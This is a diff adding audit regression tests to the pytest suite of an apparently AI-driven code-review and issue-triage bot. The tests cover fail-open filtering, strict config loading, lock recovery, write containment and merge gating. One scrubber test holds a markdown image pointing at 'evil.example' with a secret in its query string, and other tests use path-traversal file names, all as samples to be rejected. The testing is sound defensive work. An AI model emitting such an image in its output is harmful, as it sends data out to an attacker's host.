@@ -290,7 +290,7 @@ class FakeForge(ForgeAdapter):
     name = "github"
 
     def __init__(self):
-        super().__init__(cfg.ForgeBinding(role="primary", api_base="https://api.github.com"))
+        super().__init__(cfg.ForgeBinding(role="primary", api_base="https://api.github.com", token_env="GHT"))
         self.prs: list[PullRequest] = []
         self.posts: list[tuple[int, str]] = []
         self.updates: list[tuple[int, str]] = []
@@ -365,7 +365,7 @@ class TestEngine:
             return 1
 
         forge.create_comment = fake_create
-        c = make_config(shadow=False)
+        c = make_config(shadow=False, issues_enabled=True)
         c = c.model_copy(update={"bot_login": "fl4write[bot]"})
         monkeypatch.setattr("fl4write.engine.adapter_for", lambda b: forge)
         monkeypatch.setattr(
@@ -515,3 +515,211 @@ class TestMisleadingSuccess:
 
         r = CycleReport(repo="x")
         assert r.reviewed == 0 and r.scanned == 0  # zeros are zeros, not success prose
+
+
+# ---------------------------------------------------------------- audit 2026-09-01 regression set
+class TestAuditRegressions:
+    """One test per critical class from the six-lane adversarial audit."""
+
+    def test_render_parse_roundtrip(self):
+        """Renderer emits, parser reconstructs — the delta-marker contract."""
+        f = Finding(rule_id="secrets", severity="Critical", path="src/x.py", line=3, category="C", message="m", proposal="p")
+        body = renderer.render_review(make_pr(), [f], make_config(), "h1")
+        parsed = renderer.parse_finding_lines(body)
+        assert parsed == [("Critical", "src/x.py", 3, "secrets")]
+
+    def test_delta_marker_not_new_on_second_review(self):
+        """A finding present in previous_findings must NOT get the new marker."""
+        f = Finding(rule_id="secrets", severity="Major", path="a.py", line=1, category="C", message="m")
+        body = renderer.render_review(make_pr(), [f], make_config(), "h2", previous_findings=[f])
+        assert "🆕" not in body
+
+    def test_resolved_findings_render(self):
+        """Prior findings gone now are listed as resolved (the promised marker)."""
+        f = Finding(rule_id="secrets", severity="Major", path="a.py", line=1, category="C", message="m")
+        body = renderer.render_review(make_pr(), [], make_config(), "h3", previous_findings=[f])
+        assert "✅ Resolved" in body and "a.py:1" in body
+
+    def test_gatekeeper_failopen_on_any_exception(self):
+        """HTTPError-class failures must fail open (used to crash the cycle)."""
+        import urllib.error
+        c = make_config()
+        f = Finding(rule_id="secrets", severity="Major", path="a.py", line=1, category="C", message="m")
+        def boom(route, prompt):
+            raise urllib.error.HTTPError("url", 429, "rate", {}, None)
+        import fl4write.gatekeeper as gk
+        orig = gk._call_model
+        gk._call_model = boom
+        try:
+            kept, dropped = gk.filter_findings([f], c)
+        finally:
+            gk._call_model = orig
+        assert kept == [f] and dropped == 0
+
+    def test_gatekeeper_refuses_drop_all_parse_drift(self):
+        """A keep-set matching zero findings is parse failure, NOT 'clean'."""
+        c = make_config()
+        f = Finding(rule_id="secrets", severity="Major", path="a.py", line=1, category="C", message="m")
+        import fl4write.gatekeeper as gk
+        orig = gk._call_model
+        gk._call_model = lambda route, prompt: '{"keep": [{"path": "OTHER.py", "line": "9"}]}'
+        try:
+            kept, dropped = gk.filter_findings([f], c)
+        finally:
+            gk._call_model = orig
+        assert kept == [f], "garbage keep-list must fail open, not drop all"
+
+    def test_analyzer_null_findings_is_model_unavailable(self, monkeypatch):
+        """{"findings": null} must be retriable, never a clean review."""
+        from fl4write import analyzer
+        monkeypatch.setattr(analyzer, "_call_model", lambda r, p: '{"findings": null}')
+        with pytest.raises(analyzer.ModelUnavailable):
+            analyzer.analyze(make_pr(), {"a.py"}, "diff", make_config())
+
+    def test_config_unknown_key_aborts(self, tmp_path):
+        """A typo like `shdow:` must abort, not silently disable shadow."""
+        bad = tmp_path / "bad.fl4write.yaml"
+        bad.write_text(
+            "repo: o/r\nforges:\n  github:\n    role: primary\n    api_base: https://api.github.com\n"
+            "    token_env: T\nmodel:\n  endpoint: https://x.example\n  model: m\nshdow: true\n"
+        )
+        with pytest.raises(Exception):
+            cfg.load_config(bad)
+
+    def test_yaml_duplicate_key_aborts(self, tmp_path):
+        dup = tmp_path / "dup.fl4write.yaml"
+        dup.write_text(
+            "repo: o/r\nrepo: o/r\nforges:\n  github:\n    role: primary\n    api_base: https://api.github.com\n"
+            "    token_env: T\nmodel:\n  endpoint: https://x.example\n  model: m\n"
+        )
+        with pytest.raises(Exception):
+            cfg.load_config(dup)
+
+    def test_tone_fork_override_validated(self):
+        with pytest.raises(Exception):
+            cfg.RepoConfig(
+                repo="o/r",
+                forges={"g": cfg.ForgeBinding(role="primary", api_base="https://x", token_env="T")},
+                model=cfg.ModelRoute(endpoint="https://x", model="m"),
+                tone_fork_override="respectfull",
+            )
+
+    def test_state_mark_reviewed_preserves_fix_depth(self):
+        """The fix cap must persist across pushes (record was replaced before)."""
+        st = {"version": 1, "prs": {"7": {"last_reviewed_sha": "aaa", "last_outcome": "reviewed:1", "fix_depth": 2}}}
+        state.mark_reviewed(st, 7, "bbb", "reviewed:1")
+        assert st["prs"]["7"]["fix_depth"] == 2
+
+    def test_stale_empty_lock_is_broken(self, tmp_path):
+        """A pid-0 lock file (kill between open and write) must not wedge forever."""
+        lock_path = tmp_path / "repo.lock"
+        lock_path.write_text("")
+        with state.CycleLock(lock_path):
+            pass  # acquiring over an empty stale lock succeeds
+
+    def test_stale_aged_lock_is_broken(self, tmp_path):
+        import time as _t
+        lock_path = tmp_path / "repo.lock"
+        lock_path.write_text(f"999999 {_t.time() - 3 * 3600}")
+        with state.CycleLock(lock_path):
+            pass
+
+    def test_lock_held_by_live_pid(self, tmp_path):
+        lock_path = tmp_path / "repo.lock"
+        lock_path.write_text(f"{__import__('os').getpid()} 0")
+        with pytest.raises(state.CycleLockHeld):
+            with state.CycleLock(lock_path):
+                pass
+
+    def test_shadow_triage_does_not_advance_watermark(self, tmp_path, monkeypatch):
+        """LEARNINGS #2 class: shadow must never poison the live cutover."""
+        forge = FakeForge()
+        forge.issue_numbers = [5]
+        forge.issue_comments = []
+        monkeypatch.setattr("fl4write.engine.adapter_for", lambda b: forge)
+        monkeypatch.setattr(
+            "fl4write.issues._call_model",
+            lambda route, prompt: json.dumps({"labels": [], "is_duplicate": False, "duplicate_hint": None,
+                                              "draft_reply": "r", "urgency": "low", "is_regression": False,
+                                              "regression_version": None}))
+        c = make_config(shadow=True, issues_enabled=True)
+        run_cycle(c, tmp_path / "s.json", get_diff=lambda pr: (set(), ""), run_issues=True)
+        st = state.load_state(tmp_path / "s.json")
+        assert "last_triaged_number" not in st or st["last_triaged_number"] == 0
+
+    def test_diff_unavailable_skips_without_marking(self, tmp_path, monkeypatch):
+        """None diff = not reviewed (never vacuous 🎉)."""
+        forge = FakeForge()
+        forge.prs = [make_pr()]
+        monkeypatch.setattr("fl4write.engine.adapter_for", lambda b: forge)
+        monkeypatch.setattr(
+            "fl4write.analyzer._call_model",
+            lambda route, prompt: json.dumps({"findings": []}))
+        r = run_cycle(make_config(shadow=False), tmp_path / "s.json", get_diff=lambda pr: None)
+        assert r.reviewed == 0 and r.skipped_diff_unavailable == 1
+        st = state.load_state(tmp_path / "s.json")
+        assert not st["prs"], "diff-unavailable PR must not be marked reviewed"
+
+    def test_issues_enabled_gate(self, tmp_path, monkeypatch):
+        """--issues on a config with issues_enabled=false triages nothing."""
+        forge = FakeForge()
+        forge.issue_numbers = [11]
+        forge.issue_comments = []
+        monkeypatch.setattr("fl4write.engine.adapter_for", lambda b: forge)
+        c = make_config(issues_enabled=False)
+        r = run_cycle(c, tmp_path / "s.json", get_diff=lambda pr: (set(), ""), run_issues=True)
+        assert r.issues_triaged == 0
+
+    def test_executor_write_containment(self, tmp_path):
+        """Symlink and traversal paths must be refused."""
+        from fl4write import executor
+        err = executor._write_contained(tmp_path, "../escape.py", "x")
+        assert err and "unsafe" in err
+        err = executor._write_contained(tmp_path, "/abs.py", "x")
+        assert err
+        link = tmp_path / "link.py"
+        (tmp_path / "target.txt").write_text("t")
+        link.symlink_to(tmp_path / "target.txt")
+        err = executor._write_contained(tmp_path, "link.py", "x")
+        assert err and "symlink" in err
+        assert executor._write_contained(tmp_path, "ok.py", "x") is None
+
+    def test_file_content_refuses_empty_encoding(self, monkeypatch):
+        """>1MB files return encoding:none + empty content — refuse, never fabricate."""
+        from fl4write import executor
+        monkeypatch.setattr(executor, "_gh_api",
+                            lambda m, p, d=None: {"encoding": "none", "content": ""})
+        assert executor._get_file_content("o/r", "big.lock", "sha") is None
+
+    def test_merge_gate_nonvacuous_green(self):
+        from fl4write import fixlane
+        c = make_config()
+        c = c.model_copy(update={"fix": c.fix.model_copy(update={"merge_own_prs": True})})
+        # no check runs at all -> not green
+        with pytest.raises(fixlane.FixLaneBlocked):
+            fixlane.merge_own_pr(author="fl4write[bot]", bot_identity="fl4write[bot]", ci_green=False, config=c)
+
+    def test_scrub_rejects_remote_markdown_image(self):
+        bad = "see ![px](https://evil.example/px?d=secret)"
+        from fl4write import scrub
+        assert "evil.example" not in scrub.scrub(bad)
+        with pytest.raises(ValueError):
+            scrub.assert_clean(bad)
+
+    def test_gatekeeper_disabled_by_config(self):
+        c = make_config(gatekeeper=False)
+        assert c.gatekeeper is False
+
+
+@pytest.mark.parametrize("cfg_path", sorted(
+    [str(p) for p in Path(__file__).parent.parent.glob("*.fl4write.yaml")]
+), ids=lambda p: Path(p).name)
+def test_all_fleet_configs_load(cfg_path):
+    """Every fleet config loads against the strict schema (audit E8: 1-of-31
+    coverage). Set the token env vars the schemas now require."""
+    import os
+    os.environ.setdefault("CODESITTER_GITHUB_TOKEN", "test")
+    os.environ.setdefault("CODESITTER_DEEPSEEK_KEY", "test")
+    os.environ.setdefault("CODESITTER_FORGEJO_TOKEN", "test")
+    c = cfg.load_config(cfg_path)
+    assert c.repo and "/" in c.repo
